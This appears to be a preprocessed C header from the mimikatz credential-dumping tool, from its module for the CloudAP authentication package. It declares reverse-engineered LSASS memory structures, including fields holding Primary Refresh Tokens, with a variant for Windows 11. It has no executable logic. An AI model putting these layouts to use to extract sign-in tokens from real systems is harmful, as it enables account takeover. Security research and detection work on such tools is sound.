# 1 "project/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.h"





       
#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_cloudap_package;

NTSTATUS kuhl_m_sekurlsa_cloudap(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_cloudap(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _KIWI_CLOUDAP_CACHE_UNK {
 DWORD unk0;
 DWORD unk1;
 DWORD unk2;
 DWORD unkSize;
 GUID guid;
 BYTE unk[64 ];
} KIWI_CLOUDAP_CACHE_UNK, *PKIWI_CLOUDAP_CACHE_UNK;
# 39 "project/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.h"
typedef struct _KIWI_CLOUDAP_CACHE_LIST_ENTRY {
 struct _KIWI_CLOUDAP_CACHE_LIST_ENTRY *Flink;
 struct _KIWI_CLOUDAP_CACHE_LIST_ENTRY *Blink;
 DWORD unk0;
 PVOID LockList;
 PVOID unk1;
 PVOID unk2;
 PVOID unk3;
 PVOID unk4;
 PVOID unk5;
 DWORD unk6;
 DWORD unk7;
 DWORD unk8;
 DWORD unk9;
 PCWSTR unkLogin0;
 PCWSTR unkLogin1;
 wchar_t toname[64 + 1];
 PSID Sid;
 DWORD unk10;
 DWORD unk11;
 DWORD unk12;
 DWORD unk13;
 PKIWI_CLOUDAP_CACHE_UNK toDetermine;
 PVOID unk14;
 DWORD cbPRT;
 PBYTE PRT;

} KIWI_CLOUDAP_CACHE_LIST_ENTRY, *PKIWI_CLOUDAP_CACHE_LIST_ENTRY;

typedef struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY {
 struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Flink;
 struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Blink;
 DWORD unk0;
 DWORD unk1;
 LUID LocallyUniqueIdentifier;
 DWORD64 unk2;
 DWORD64 unk3;
 PKIWI_CLOUDAP_CACHE_LIST_ENTRY cacheEntry;

} KIWI_CLOUDAP_LOGON_LIST_ENTRY, *PKIWI_CLOUDAP_LOGON_LIST_ENTRY;

typedef struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY_11 {
 struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Flink;
 struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Blink;
 DWORD unk0;
 DWORD unk1;
 DWORD unk2;
 LUID LocallyUniqueIdentifier;
 DWORD unk3;
 DWORD unk4;
 DWORD unk5;
 DWORD unk6;
 PKIWI_CLOUDAP_CACHE_LIST_ENTRY cacheEntry;

} KIWI_CLOUDAP_LOGON_LIST_ENTRY_11, *PKIWI_CLOUDAP_LOGON_LIST_ENTRY_11;
